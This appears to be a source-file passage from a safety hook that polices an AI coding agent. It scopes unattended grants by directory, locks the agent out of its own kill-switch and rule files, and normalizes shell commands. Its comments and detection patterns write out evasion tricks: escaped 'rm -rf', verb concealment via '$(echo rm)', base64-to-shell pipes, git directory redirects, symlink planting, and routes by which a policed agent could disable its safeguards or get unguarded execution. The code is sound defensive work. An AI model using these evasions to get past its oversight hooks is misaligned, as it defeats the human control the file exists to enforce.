# Builtins that move the working directory. Their effect on a LATER subcommand
# is not statically knowable, so their presence makes the whole command
# unscopeable.
_CWD_CHANGING = {"cd", "pushd", "popd", "chdir"}

# Programs whose job is to run ANOTHER program. The rule matched text inside
# them, so the directory the real work happens in is whatever the inner command
# decides — not something this parser can claim to know.
_INDIRECT_RUNNERS = {
    "sh", "bash", "zsh", "dash", "ksh", "fish",
    "env", "xargs", "sudo", "doas", "su", "ssh", "nohup", "setsid",
    "timeout", "nice", "ionice", "stdbuf", "script", "watch", "parallel",
    "command", "exec", "time", "find", "make", "nix-shell", "docker", "podman",
}

# git's directory-redirecting global options. `-C` and `--git-dir` /
# `--work-tree` all accept BOTH `--opt=<path>` and `--opt <path>` against the
# real binary (verified on git 2.50.1 in #913's review), so both are parsed.
#
# COORDINATION WITH #913: that issue normalizes git's global options out of the
# command BEFORE rule matching, so every git rule stops being defeated by
# `git -C <dir> …`. This function is the shared parser for that grammar —
# #913's normalizer should consume `git_global_dirs` rather than write a second
# copy, and the two have opposite needs on the same data: the normalizer wants
# the options GONE, scope evaluation wants the directory they name. Splitting
# it here gives both from one implementation.
_GIT_DIR_OPTS_VALUE = {"-C", "--git-dir", "--work-tree"}

# Global options that take a separate value but name no DIRECTORY. Their value
# must still be consumed, or it gets mistaken for the subcommand.
# ``--exec-path`` is deliberately absent: bare ``--exec-path`` makes git print
# the exec path and exit, so ``git --exec-path status`` never runs ``status`` —
# consuming a token there would swallow a subcommand a rule needs to see. Only
# its ``=`` form carries a value, which the generic ``-`` branch handles.
_GIT_OPTS_VALUE_NOT_DIR = {
    "-c", "--config-env", "--namespace", "--attr-source", "--super-prefix",
}

# Environment assignments git honours to pick a DIFFERENT repo than the cwd.
# `GIT_DIR=<other> git commit` beats the working directory outright (verified
# against git 2.50.1), so an assignment prefix is a repo selector exactly like
# `-C` — and one that `_strip_assignments` used to discard before anything
# looked at it.
_GIT_DIR_ENV_VARS = {
    "GIT_DIR", "GIT_WORK_TREE", "GIT_COMMON_DIR", "GIT_INDEX_FILE",
    "GIT_OBJECT_DIRECTORY", "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    "GIT_CEILING_DIRECTORIES", "GIT_NAMESPACE",
}


def git_global_dirs(argv: List[str]) -> Tuple[Dict[str, Any], List[str]]:
    """Split a ``git`` argv into ``(directory selectors, remaining argv)``.

    Selectors are returned STRUCTURED, not as one flat list, because the three
    options do not relate to each other or to the cwd the same way — and a flat
    list cannot express either relationship. Verified against real git 2.50.1:

    * ``-C`` is **CUMULATIVE**, folded left to right, each value resolved
      against the previous result (an absolute value resets the chain)::

          $ git -C outer -C inner rev-parse --show-prefix
          inner/                       # not `outer/`, and not `inner` from cwd

      Resolving each ``-C`` against the cwd instead collapses
      ``git -C <in-scope> -C ../..`` onto the in-scope directory, so a scope
      check sees one in-scope target and grants while git chdirs out of it.

    * ``--git-dir`` / ``--work-tree`` are **LAST-ONE-WINS**, and a relative
      value resolves against the directory the ``-C`` chain produced::

          $ cd <base>; git -C other --git-dir=.git rev-parse --absolute-git-dir
          <base>/other/.git            # relative to the -C result, not to cwd

    ``remaining argv`` is the command with git's global options removed —
    ``["git", "commit", "-m", "x"]`` for ``git -C /r commit -m x`` — which is
    the form a rule pattern like ``\\bgit\\s+commit\\b`` was written against.
    """
    chdir: List[str] = []
    git_dir: Optional[str] = None
    work_tree: Optional[str] = None
    rest: List[str] = argv[:1]

    def _record(opt: str, value: str) -> None:
        nonlocal git_dir, work_tree
        if opt == "-C":
            chdir.append(value)
        elif opt == "--git-dir":
            git_dir = value
        else:
            work_tree = value

    i = 1
    while i < len(argv):
        tok = argv[i]
        if tok in _GIT_DIR_OPTS_VALUE:
            if i + 1 < len(argv):
                _record(tok, argv[i + 1])
            i += 2
            continue
        if tok in _GIT_OPTS_VALUE_NOT_DIR:
            i += 2
            continue
        matched = False
        for opt in _GIT_DIR_OPTS_VALUE:
            if tok.startswith(opt + "="):
                _record(opt, tok[len(opt) + 1:])
                matched = True
                break
        if matched:
            i += 1
            continue
        if tok.startswith("-"):
            i += 1
            continue
        rest.extend(argv[i:])
        break
    return {"chdir": chdir, "git_dir": git_dir, "work_tree": work_tree}, rest


def _git_repo_root(path: str) -> Optional[str]:
    """Nearest enclosing directory containing ``.git``, walking up from ``path``.

    git resolves the repo by walking UP, so the directory a command runs in is
    not the repo it commits to. A scope naming ``<repo>/subdir`` would otherwise
    grant over the whole of ``<repo>`` — silently, because the cwd it measured
    really is inside the scope. Pure filesystem probing, no subprocess: the hook
    is on the tool's hot path.

    ``.git`` may be a file (worktrees, submodules) as well as a directory; both
    count. Returns None when nothing is found — which happens for a path that
    does not exist yet, so callers must not read None as "no constraint
    needed" for a security decision, only as "no repo root discoverable".
    """
    current = os.path.abspath(path)
    while True:
        if os.path.exists(os.path.join(current, ".git")):
            return current
        parent = os.path.dirname(current)
        if parent == current:
            return None
        current = parent


def _split_assignments(argv: List[str]) -> Tuple[List[str], List[str]]:
    """Split leading ``VAR=value`` prefixes off an argv.

    Returns ``(assignments, rest)`` — NOT just ``rest``. Discarding them is how
    ``GIT_DIR=<other-repo> git commit`` slipped past scope evaluation entirely:
    the redirect vanished before anything looked at it and the check fell back
    to the cwd, which was in scope. An assignment prefix is a repo selector
    exactly like ``-C``.
    """
    i = 0
    while i < len(argv) and _ASSIGN_TOKEN_RE.match(argv[i]):
        i += 1
    return argv[:i], argv[i:]


# Shell operators, and the grouping tokens that make a segment's execution
# context something this parser will not reason about.
_SCOPE_OPERATORS = {";", "&&", "||", "|", "&", "\n", ";;", "|&"}
_SCOPE_GROUPING = {"(", ")", "{", "}"}


def _scope_segments(command: str) -> Tuple[List[Tuple[List[str], str]], Optional[str]]:
    """Split ``command`` into ``[(argv, operator_that_follows)]``.

    This is a SECOND, deliberately separate splitter from
    ``normalize_subcommands`` — that one discards the operators, and scope
    evaluation needs them: ``cd X && git commit`` and ``cd X ; git commit``
    describe different directories for the same ``git commit``.

    OWNERSHIP NOTE (#913/#914/#915 orchestrator ruling): ``normalize_subcommands``
    / ``masked_subcommands`` / the haystack selection belong to #913, and this
    file must not fork them. So scope evaluation gets its own local splitter
    rather than an edit there. Once #913 has landed its haystack work, these two
    are a consolidation candidate — flagged, not done here.
    """
    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        tokens = list(lex)
    except ValueError:
        return [], "unbalanced quotes"

    segments: List[Tuple[List[str], str]] = []
    cur: List[str] = []
    for tok in tokens:
        if tok in _SCOPE_GROUPING:
            return [], "command uses a subshell/group — execution context is not statically knowable"
        if tok in _SCOPE_OPERATORS:
            segments.append((cur, tok))
            cur = []
            continue
        cur.append(tok)
    segments.append((cur, ""))
    return [(argv, op) for argv, op in segments if argv or op], None


def _cd_target(argv: List[str]) -> Optional[str]:
    """Directory a ``cd`` segment moves to, or None when it is not resolvable.

    Only the literal forms are resolved. ``cd -`` (previous dir), ``cd $VAR``
    and anything with extra operands are deliberately unresolved — a scope that
    guessed here would be measuring the wrong directory.
    """
    if len(argv) == 1:
        return os.path.expanduser("~")
    if len(argv) != 2:
        return None
    target = argv[1]
    if target == "-" or target.startswith("$") or "$" in target:
        return None
    return target


def _abs_path(raw: str, base: str) -> str:
    """``raw`` as a normalized absolute path, interpreted relative to ``base``.

    Single-valued, unlike :func:`_resolve_dir` — used where a path must be
    threaded into a further resolution (folding a ``-C`` chain), where two
    candidate forms would have nothing to fold onto.
    """
    expanded = os.path.expanduser(raw)
    if not os.path.isabs(expanded):
        expanded = os.path.join(base, expanded)
    return os.path.normpath(expanded)


def _resolve_dir(raw: str, cwd: str) -> List[str]:
    """Absolute forms of ``raw`` interpreted relative to ``cwd``.

    Returns BOTH the lexically-normalized path and its ``realpath``. Both must
    land in scope for a grant to apply: normalizing alone lets
    ``<store>/../../..`` escape, and realpath alone lets a scope pattern be
    dodged by a symlink planted inside the scope — which the grantee can do,
    since ``ln -s`` / ``mkdir`` / ``git init`` are all allowed unattended
    (review §5). The grantee-can-write-inside-the-scope case is the threat
    model, not a cooperative caller.
    """
    expanded = os.path.expanduser(raw)
    if not os.path.isabs(expanded):
        expanded = os.path.join(cwd, expanded)
    normalized = os.path.normpath(expanded)
    out = [normalized]
    try:
        real = os.path.realpath(normalized)
    except OSError:
        return out
    if real != normalized:
        out.append(real)
    return out


def command_scope_dirs(
    command: str,
    cwd: str,
    pattern: Optional[str] = None,
) -> Tuple[List[str], Optional[str]]:
    """Directories the rule-matching parts of ``command`` would act on.

    Returns ``(dirs, unscopeable)``. ``unscopeable`` is a reason string when the
    answer cannot be established — the caller must then NOT apply a scoped
    grant. ``dirs`` holds absolute paths (normalized and, where different,
    realpath'd); EVERY one of them must be in scope for the grant to apply
    (all-paths semantics, matching ``is_command_path_allowed``).

    Three independent selectors decide which repo a git command touches — the
    working directory, ``-C``, and ``--git-dir``/``--work-tree`` — so all three
    are read, and a command that names both an in-scope and an out-of-scope one
    is refused on the out-of-scope one.

    Only the segments the rule's own ``pattern`` matches are considered, so an
    innocuous tail (``git -C <store> commit -m x && echo done``) does not drag
    the session cwd into the scope test.

    Reads the RAW command, never a normalized haystack — so it is independent
    of #913's land order (the orchestrator ruling keeps the raw command
    reachable precisely so this stays true).
    """
    if pattern and pattern.startswith("ambiguous:"):
        return [], pattern.split(":", 1)[1] or "unverifiable command"

    obf = detect_obfuscation(command)
    if obf:
        return [], obf

    segments, split_err = _scope_segments(command)
    if split_err:
        return [], split_err
    if not segments:
        return [], "no command to evaluate"

    dirs: List[str] = []
    considered = 0
    current_dir = cwd

    for argv, following_op in segments:
        assigns, argv = _split_assignments(argv)
        if not argv:
            continue
        head = os.path.basename(argv[0])

        if head in _CWD_CHANGING:
            # A `cd` only pins the directory for what follows when the shell
            # guarantees it ran AND succeeded — i.e. when `&&` joins them. With
            # `;` the next segment runs even if the `cd` failed, so it could
            # execute in either directory and we will not pick one.
            if head != "cd":
                return [], f"command uses {head} — directory stack is not statically knowable"
            if following_op != "&&":
                return [], (
                    f"`cd` is joined by '{following_op or 'nothing'}' rather than '&&', so the "
                    "directory the next command runs in is not statically knowable"
                )
            target = _cd_target(argv)
            if target is None:
                return [], "`cd` target is not a literal path"
            resolved = _resolve_dir(target, current_dir)
            # `cd` through a symlink leaves the shell's logical cwd at the
            # symlink path, so track the lexical form; the realpath form is
            # still checked below via _resolve_dir on the acting segment.
            current_dir = resolved[0]
            continue

        is_git = head == "git"
        gopts, stripped = (
            git_global_dirs(argv) if is_git
            else ({"chdir": [], "git_dir": None, "work_tree": None}, argv)
        )

        if pattern:
            # Match the rule against BOTH the segment as written and its
            # git-global-stripped form. The first is what matches today; the
            # second is what will match once #913 normalizes those options away
            # before rule matching. Handling both keeps scope evaluation
            # correct on either side of that change.
            haystacks = [" ".join(assigns + argv), " ".join(assigns + stripped)]
            try:
                if not any(re.search(pattern, h, re.IGNORECASE) for h in haystacks):
                    continue
            except re.error:
                return [], "rule pattern is not a usable regex"
        considered += 1

        if head in _INDIRECT_RUNNERS:
            return [], f"command runs through {head} — target directory is not statically knowable"

        # Fold the `-C` chain FIRST — it establishes the directory everything
        # else on this segment is measured from. Left to right, each value
        # against the running result, an absolute value resetting the chain
        # (real git semantics; see git_global_dirs). Resolving each `-C`
        # against the cwd instead lets `git -C <in-scope> -C ../..` collapse
        # onto the in-scope directory and be granted while git walks out of it.
        acting_dir = current_dir
        for hop in gopts["chdir"]:
            acting_dir = _abs_path(hop, acting_dir)
        dirs.extend(_resolve_dir(acting_dir, current_dir))

        # `--git-dir` / `--work-tree` are last-one-wins and resolve against the
        # `-C` result, not the cwd.
        for selector in (gopts["git_dir"], gopts["work_tree"]):
            if selector:
                dirs.extend(_resolve_dir(selector, acting_dir))

        # Environment assignments. Recognized git repo selectors are read as
        # target directories; ANY other assignment refuses, because we cannot
        # know whether an env var we do not model redirects the tool. This is
        # the same answer `env VAR=… git commit` already got by being an
        # indirect runner — the two spellings of one redirection now agree.
        # Resolved against the acting directory for the same reason as above.
        for assign in assigns:
            name, _, value = assign.partition("=")
            if name in _GIT_DIR_ENV_VARS:
                if value:
                    dirs.extend(_resolve_dir(value, acting_dir))
                continue
            return [], (
                f"command sets {name} — an environment override may redirect "
                f"{head} to a different target, which is not statically knowable"
            )

        if head == "git":
            # git resolves its repo by walking UP from the working directory, so
            # the directory the command runs in is NOT necessarily the repo it
            # writes to. Require the enclosing repo ROOT to be in scope as well.
            #
            # CHOSEN over the alternative of refusing a non-root scope at lint
            # time: a lint sees only the scope as written, and a scope like
            # `~/.claude/projects/*/memory/` is legitimate right up until
            # someone runs `git init ~/.claude`, after which every memory store
            # is a subdirectory of one big repo. Checking at decision time
            # follows the filesystem instead of a snapshot of it.
            for candidate in list(dirs):
                root = _git_repo_root(candidate)
                if root:
                    dirs.extend(_resolve_dir(root, current_dir))

    if pattern and considered == 0:
        # The rule matched the command as a whole but no individual segment —
        # e.g. it matched inside an `sh -c` payload that `masked_subcommands`
        # re-scanned. We cannot say which directory that would touch.
        return [], "no subcommand matched the rule — target directory is not statically knowable"
    if not dirs:
        return [], "no target directory could be determined"
    # Stable order, no duplicates.
    return sorted(set(dirs)), None


_GLOB_CHARS = set("*?[")


def _scope_variants(scope_pattern: str) -> List[str]:
    """The scope pattern, plus a form with its literal prefix realpath'd.

    Resolve BOTH sides before comparing (review §5). The candidate path is
    offered in normalized and realpath'd form; the scope needs the same
    treatment or a scope rooted under a symlinked directory (``~/.claude`` ->
    elsewhere) would reject its own legitimate contents. Only the literal
    prefix up to the first glob character can be resolved — the rest is a
    pattern, not a path.
    """
    expanded = os.path.normpath(os.path.expanduser(scope_pattern).rstrip("/"))
    variants = [expanded]
    idx = next((i for i, ch in enumerate(expanded) if ch in _GLOB_CHARS), None)
    literal = expanded if idx is None else expanded[:idx].rsplit("/", 1)[0]
    if not literal or not os.path.isabs(literal):
        return variants
    try:
        real = os.path.realpath(literal)
    except OSError:
        return variants
    if real != literal:
        variants.append(real + expanded[len(literal):])
    return variants


def path_in_scope(path: str, scope_pattern: str) -> bool:
    """True when ``path`` is the directory ``scope_pattern`` names, or under it.

    ``*`` matches within one path segment, ``**`` crosses segments — the same
    reading as the rest of the rule files. Matching is exact (no case folding):
    a scope is a security boundary, and on a case-insensitive filesystem a
    permissive fold is the wrong direction to be wrong in.
    """
    normalized = os.path.normpath(path)
    for variant in _scope_variants(scope_pattern):
        if not variant:
            continue
        regex = ""
        i = 0
        while i < len(variant):
            ch = variant[i]
            if ch == "*":
                if variant[i:i + 2] == "**":
                    regex += ".*"
                    i += 2
                    continue
                regex += "[^/]*"
            elif ch == "?":
                regex += "[^/]"
            else:
                regex += re.escape(ch)
            i += 1
        try:
            if re.fullmatch(regex + r"(?:/.*)?", normalized):
                return True
        except re.error:
            continue
    return False


def unattended_grant_allows(
    rule_id: Optional[str],
    command: str,
    grants: Dict[str, List[List[str]]],
    cwd: str,
    pattern: Optional[str] = None,
    scopeable: bool = True,
) -> Tuple[bool, str]:
    """Does an unattended grant permit this ``ask``-tier command? ``(allowed, why)``.

    ``why`` is written to be read by a human in the block message — a refused
    scoped grant must say what it granted and what the command targeted, or the
    host is back to debugging a nightly timeout.

    ``scopeable=False`` declares that ``command`` has no filesystem target to
    measure a scope against — the MCP hook's synthesized ``agentwire email
    --to …`` is a tool invocation, not a command that touches a directory.
    A scoped grant then REFUSES rather than silently measuring the scope
    against the session cwd, which would have nothing to do with what the tool
    actually does.
    """
    if not rule_id:
        return False, "the matched rule has no id, so no grant can name it"
    scopes = grants.get(rule_id)
    if scopes is None:
        return False, f"rule '{rule_id}' is not on the unattended allowlist"
    if not scopes:
        # Named by an entry that did not parse. Deliberately NOT a fall-through
        # to a looser layer — see parse_unattended_allow.
        return False, (
            f"rule '{rule_id}' is named in unattended_allow but its entry is malformed, "
            f"so it grants nothing (check `agentwire tasks review` for the reason)"
        )
    if any(not s for s in scopes):
        return True, f"rule '{rule_id}' is granted unattended (unscoped)"

    flat = [p for s in scopes for p in s]
    if not scopeable:
        return False, (
            f"rule '{rule_id}' is granted only under {', '.join(flat)}, and this "
            f"action has no filesystem target to measure that scope against"
        )
    dirs, unscopeable = command_scope_dirs(command, cwd, pattern=pattern)
    if unscopeable:
        return False, (
            f"rule '{rule_id}' is granted only under {', '.join(flat)}, and this "
            f"command's target directory cannot be established ({unscopeable})"
        )
    outside = [d for d in dirs if not any(path_in_scope(d, p) for p in flat)]
    if outside:
        return False, (
            f"rule '{rule_id}' is granted only under {', '.join(flat)}, but this "
            f"command targets {', '.join(outside)}"
        )
    return True, (
        f"rule '{rule_id}' is granted under {', '.join(flat)}; "
        f"this command targets {', '.join(dirs)}"
    )


def load_safety_config(
    global_config_path: Optional[Path] = None,
    cwd: Optional[str] = None,
) -> Dict[str, Any]:
    """Resolve the effective safety knobs from the dedicated damage-control files.

    The kill switch and rule knobs live in HOST-OWNED, agent-unwritable files
    (see ``is_protected_control_plane``) — never in ``config.yaml`` /
    ``.agentwire.yml``, which the policed agent can edit:

      * Global:  ``~/.agentwire/damagecontrol.yml``
      * Project: ``.damagecontrol.yml`` (nearest, walking up from ``cwd``)

    Each holds top-level ``enabled`` / ``disabled_rules`` / ``unattended_allow``.
    Returns ``{enabled, disabled_rules, unattended_allow}``. A project
    ``.damagecontrol.yml`` may both loosen AND tighten ``enabled`` (it simply
    wins); ``disabled_rules`` / ``unattended_allow`` are merged (set-union).

    Fail-secure: a missing/unreadable/yaml-less global file ⇒ ``enabled: true``.
    """
    enabled = True
    disabled_rules: List[str] = []
    unattended_allow: List[str] = []
    project_enabled: Optional[bool] = None
    if not yaml:
        return {"enabled": enabled, "disabled_rules": disabled_rules,
                "unattended_allow": unattended_allow}

    def _absorb(data: Any) -> Optional[bool]:
        """Pull knobs from a parsed policy doc; return its ``enabled`` (or None)."""
        local_enabled: Optional[bool] = None
        if isinstance(data, dict):
            if "enabled" in data and data["enabled"] is not None:
                local_enabled = bool(data["enabled"])
            rules = data.get("disabled_rules", [])
            if isinstance(rules, list):
                disabled_rules.extend(str(r) for r in rules if r)
            allow = data.get("unattended_allow", [])
            if isinstance(allow, list):
                unattended_allow.extend(str(a) for a in allow if a)
        return local_enabled

    if global_config_path is None:
        global_config_path = Path.home() / ".agentwire" / "damagecontrol.yml"
    try:
        if global_config_path.exists():
            with open(global_config_path, "r") as f:
                gdata = yaml.safe_load(f) or {}
            genabled = _absorb(gdata)
            if genabled is not None:
                enabled = genabled
    except Exception:
        pass

    if cwd is None:
        cwd = os.environ.get("PWD", os.getcwd())
    current = os.path.abspath(cwd)
    while True:
        candidate = os.path.join(current, ".damagecontrol.yml")
        if os.path.isfile(candidate):
            try:
                with open(candidate, "r") as f:
                    pdata = yaml.safe_load(f) or {}
                project_enabled = _absorb(pdata)
            except Exception:
                pass
            break
        parent = os.path.dirname(current)
        if parent == current:
            break
        current = parent

    if project_enabled is not None:
        enabled = project_enabled

    return {
        "enabled": enabled,
        "disabled_rules": sorted(set(disabled_rules)),
        "unattended_allow": sorted(set(unattended_allow)),
    }


# ============================================================================
# PROTECTED CONTROL PLANE (escape-hatch- AND kill-switch-EXEMPT)
# ============================================================================
#
# Damage control reads its kill switch, its rules, and its own hook
# registration from files on disk. If the policed agent can write those files,
# it can disable safety, act, and re-enable — defeating everything (#466). So
# the WHOLE control plane is hard-protected: any write/edit/delete/move/chmod
# targeting one of these paths is BLOCKED, and — unlike every other rule — the
# ``# allow:`` escape hatch and the ``enabled: false`` kill switch do NOT
# override it. Only the user's ``allowedPaths`` allowlist can re-permit a path,
# because that is a human, host-side opt-in (the agent cannot add to it without
# editing a protected file, which is itself blocked).
#
# The guarantee: the agent only ever operates within the freedom the human
# preset. Loosening is always a host-side act.

PROTECTED_CONTROL_PLANE_PATHS = [
    "~/.agentwire/damagecontrol.yml",   # global kill switch + rule knobs
    "*.damagecontrol.yml",              # project kill switch + rule knobs (any dir)
    "~/.claude/settings.json",          # PreToolUse hook registration
    "~/.agentwire/hooks/damage-control/*.py",  # the hook scripts themselves
    "~/.claude/hooks/*",                # agentwire-owned Claude Code hooks
    "~/.agentwire/damage-control/*.yaml",      # the damage-control rule files
    # Execution-plane configs: agentwire runs strings from these files through
    # its OWN ``subprocess.run(..., shell=True)`` calls (scheduler gate commands
    # in scheduler.py, service healthchecks in services.py) — those subprocesses
    # do NOT traverse the Claude Code hook, so a policed agent that can write a
    # gate/healthcheck gets unguarded code execution on the next tick (a
    # confused-deputy escape). Treat them as control plane (#466 lockdown).
    "~/.agentwire/scheduler.yaml",      # scheduler gate commands run via shell
    "~/.agentwire/config.yaml",         # service healthcheck commands run via shell
    # Per-project task-EXECUTION config (#720): split out of ``.agentwire.yml``,
    # which is now purely declarative (type/roles/voice/parent/worktree) and
    # agent-writable again — it carries no exec vector. ``.agentwire.tasks.yml``
    # holds the ``tasks:`` block (pre/post/on_task_end/shell/unattended_allow),
    # which agentwire runs the same way (confused-deputy risk above), so it
    # stays protected. Authored via propose-and-promote: an agent drafts to the
    # UNPROTECTED ``.agentwire.tasks.proposed.yml`` staging file; a human reviews
    # (``agentwire tasks review``) and promotes (``agentwire tasks promote``) —
    # the agent never writes the live file. See ``agentwire/tasks_cli.py``.
    "*.agentwire.tasks.yml",            # project task-execution config (any dir)
]


def _protected_path_patterns() -> List[str]:
    """Protected paths in both ``~``-form and ``$HOME``-expanded form.

    Commands may reference either; including both ensures the regex/glob
    matchers catch e.g. ``/Users/me/.claude/settings.json`` and
    ``~/.claude/settings.json`` alike.
    """
    out: List[str] = []
    for p in PROTECTED_CONTROL_PLANE_PATHS:
        out.append(p)
        expanded = os.path.expanduser(p)
        if expanded != p:
            out.append(expanded)
    return out


def _matched_protected_pattern(file_path: str) -> Optional[str]:
    """The protected-path pattern that matches ``file_path``, if any."""
    for pat in _protected_path_patterns():
        if match_path(file_path, pat):
            return pat
    return None


def is_protected_control_plane(file_path: str) -> bool:
    """True if ``file_path`` is part of the damage-control control plane."""
    return _matched_protected_pattern(file_path) is not None


def _protected_reason(matched_pattern: str) -> str:
    """Block reason for a protected-control-plane hit, tailored to the path.

    ``.agentwire.tasks.yml`` has a real, host-side remedy (propose-and-promote,
    #720) — name it so the agent doesn't dead-end. Everything else keeps the
    generic "edit on the host" message.
    """
    if matched_pattern.endswith(".agentwire.tasks.yml"):
        return (
            "protected task-execution control-plane file (host-owned) — draft "
            "to .agentwire.tasks.proposed.yml instead, then ask the host to run "
            "`agentwire tasks review` and `agentwire tasks promote`"
        )
    return "protected control-plane file (host-owned; edit on the host)"


def check_protected_path(
    file_path: str,
    allowed_paths: List[Dict[str, Any]],
) -> Tuple[bool, str]:
    """Block edits/writes to a control-plane file unless the user allowlisted it.

    Used by the edit/write hooks. The allowlist (a human opt-in) may override;
    nothing else does.
    """
    matched = _matched_protected_pattern(file_path)
    if matched:
        if is_path_allowed_for_op(file_path, allowed_paths, "edit"):
            return False, ""
        return True, _protected_reason(matched)
    return False, ""


def check_protected_command(
    command: str,
    allowed_paths: List[Dict[str, Any]],
) -> Tuple[bool, str]:
    """Block a bash command that writes/edits/deletes a control-plane file.

    Mirrors the ``readOnlyPaths`` matcher but is escape-hatch- and
    kill-switch-exempt. The user's allowlist may re-permit a specific path.

    Matches against the raw command AND its normalized subcommands so quoting /
    escaping (``r\\m``, ``r''m``) can't sneak a write past the control-plane gate.
    """
    subcommands, _ambiguous = normalize_subcommands(command)
    haystacks = [command] + [s for s in subcommands if s and s != command]
    for path in _protected_path_patterns():
        for hay in haystacks:
            matched, reason = check_path_patterns(
                hay,
                path,
                READ_ONLY_BLOCKED + INTERPRETER_WRITE_PATTERNS,
                "protected control-plane path",
            )
            if matched:
                op = _infer_operation_from_reason(reason)
                if is_command_path_allowed(command, allowed_paths, op):
                    break
                return True, _protected_reason(path)
    return False, ""


# ============================================================================
# PROTECTED COMMANDS (escape-hatch- AND kill-switch-EXEMPT, like the protected
# control plane above, but keyed on COMMAND SHAPE rather than a file path)
# ============================================================================
#
# Some operations are dangerous no matter which file they touch — running
# them at all IS the confused-deputy escape, not merely writing a particular
# path. ``agentwire tasks promote`` is the first case (#720/#721 review):
# it's the host-trusted program that copies a vetted draft into the protected
# ``.agentwire.tasks.yml``. If a policed/unattended agent could just invoke
# the CLI itself, the file protection above is moot — so this, like the
# protected-path check, is evaluated before ``detect_escape_hatch`` and the
# kill switch, and has NO allowlist override (there's no legitimate reason
# for an agent to ever run this; unlike a path, there's nothing to allowlist
# it TO). This is defense in depth on TOP OF ``cmd_tasks_promote``'s own
# runtime refusal (unattended check + host-context gate in ``tasks_cli.py``)
# — that second gate is what actually closes the ``python3 -c
# "from agentwire.tasks_cli import cmd_tasks_promote; ..."`` bypass, since a
# raw interpreter call never matches a bash command pattern at all.

PROTECTED_COMMAND_PATTERNS: List[Tuple[str, str]] = [
    (
        r'\bagentwire\s+tasks\s+promote\b',
        "agentwire tasks promote writes the protected .agentwire.tasks.yml — "
        "host-only, run it from your own terminal (not through an agent).",
    ),
]


def check_protected_bash_command(command: str) -> Tuple[bool, str]:
    """Block a command matching a ``PROTECTED_COMMAND_PATTERNS`` entry.

    Unconditional — no allowlist override, no escape hatch, no kill switch
    (see module note above). These are COMMAND-PREFIX patterns, so — like the
    ``anchored`` tooldef bashToolPatterns (#675) — matched only against
    ``masked_subcommands``: quoting/escaping of the command itself still
    normalizes to the literal form (``agentwire tasks prom''ote`` can't sneak
    past), but quoted CONTENT (a commit message, an echo string) that merely
    *mentions* the phrase is masked out first, so it can't false-match.
    """
    haystacks = masked_subcommands(command)
    for pattern, reason in PROTECTED_COMMAND_PATTERNS:
        for hay in haystacks:
            try:
                if re.search(pattern, hay, re.IGNORECASE):
                    return True, reason
            except re.error:
                continue
    return False, ""


_ESCAPE_HATCH_RE = re.compile(r"#\s*allow:[ \t]*([^\n]+)", re.IGNORECASE)


def detect_escape_hatch(command: str) -> Optional[str]:
    """Return the reason if ``command`` contains a ``# allow: <reason>`` marker.

    Non-empty reason required; matches the rest of the comment line so the
    marker works on multi-line / chained commands too.
    """
    if not command:
        return None
    m = _ESCAPE_HATCH_RE.search(command)
    if not m:
        return None
    reason = m.group(1).strip()
    return reason or None


# ============================================================================
# SHELL-AWARE NORMALIZATION
# ============================================================================
#
# The bash matcher historically ran the rule regexes against the RAW command
# string. With no tokenization, trivial shell quoting/escaping defeated every
# rule: ``r\m -rf /x`` (backslash), ``r''m -rf /x`` (empty quotes),
# ``R=rm; $R -rf /x`` ($VAR indirection) all read as ALLOWED while literal
# ``rm -rf /x`` blocked. We now ALSO match against a normalized form where
# quotes/escapes are removed (via ``shlex``) and simple ``$VAR`` assignments are
# resolved, split per subcommand. Anything we cannot tokenize safely — command
# substitution (``$(...)`` / backticks), ``eval``, a ``base64 -d | sh`` pipeline,
# or unbalanced quotes — FAILS CLOSED (escalated to ``ask``, which the unattended
# resolver turns into a block).

_SUBSTITUTION_RE = re.compile(r"\$\(|`")
_EVAL_RE = re.compile(r"(?:^|[\s;&|({])eval(?:\s|$)")
_BASE64_PIPE_RE = re.compile(r"\bbase64\b[^\n|]*(?:-d|--decode)[^\n|]*\|", re.IGNORECASE)
_ASSIGN_RE = re.compile(
    r"(?:^|[\n;&|]|&&|\|\|)\s*([A-Za-z_]\w*)=('[^']*'|\"[^\"]*\"|[^\s;|&]*)"
)
_SHELL_OPERATORS = {";", "&&", "||", "|", "&", "\n", ";;", "|&"}

#
# VERB CONCEALMENT (#925)
#
# ``core.ambiguous-command`` used to fail closed on ANY command containing
# ``$(...)`` or a backtick. That was 52 of the 100 unattended blocks measured
# over the 14 days to 2026-08-06 — a loop over the memory stores, a loop
# querying ``gh`` for issue states, an ``echo`` reading tmux state. It is most
# of what an agent writes.
#
# The tempting narrowing is "fire only when the substitution is an operand of a
# destructive verb". That cut is BACKWARDS, and measuring it is what shows why
# (tests/unit/test_ambiguous_command.py runs each case with the check disabled,
# so "what does the rest of the corpus say on its own?" is answered rather than
# assumed):
#
#     rm -rf $(cat /tmp/x)        block core.rm-with-recursive-or-force-flags
#                                 ... and STILL blocks with this check deleted
#     $(echo rm) -rf /tmp/victim  ask   core.ambiguous-command
#                                 ... falls through to ALLOW with it deleted
#
# The motivating dangerous example is already caught by the deleting verb's own
# rule. The operand form is REDUNDANT coverage. What only this check catches is
# the form where THE VERB ITSELF IS CONCEALED — and in that form there is no
# visible destructive verb at all, so a rule keyed on "operand of a destructive
# verb" finds nothing, does not fire, and permits it. Scoping to operands would
# have deleted the rule's only real coverage and kept its redundant coverage.
#
# So the cut is the inverse: fire on CONCEALMENT OF THE VERB, not on the
# presence of a substitution.
#
#   1. An unresolved expansion in COMMAND POSITION — ``$(echo rm) -rf /``,
#      `` `x` arg``, ``$CMD -rf /``. What runs is not knowable statically.
#   2. That expansion feeding a shell/interpreter payload — ``sh -c "$(...)"``,
#      ``python3 -c "$(...)"``. Same thing one level down.
#   3. ``eval`` and a decode-into-shell pipeline, unchanged.
#   4. Text we cannot tokenize at all (unbalanced quotes), unchanged.
#
# A substitution in OPERAND position is not concealment: the verb is literal and
# has already been judged against the whole corpus. Its body is not waved
# through either — substitution bodies are extracted and scanned as commands in
# their own right (``split_substitutions`` below), so ``echo "$(rm -rf /)"``
# blocks on the delete rule rather than on this one.

# Sentinel standing in for an extracted substitution. Must be a character no
# rule pattern can match, so a masked operand cannot false-match anything.
_SUBST = "\x01"

# Shared with the masking section below (``masked_subcommands`` recurses into a
# ``<shell> -c`` payload on the same names). Defined here because concealment
# detection runs first and needs them at import time.
_SHELL_NAMES = {"sh", "bash", "zsh", "dash", "ksh"}
_ASSIGN_TOKEN_RE = re.compile(r"^[A-Za-z_]\w*=")

# Interpreters whose ``-c``/``-e`` payload is a program. A concealed payload
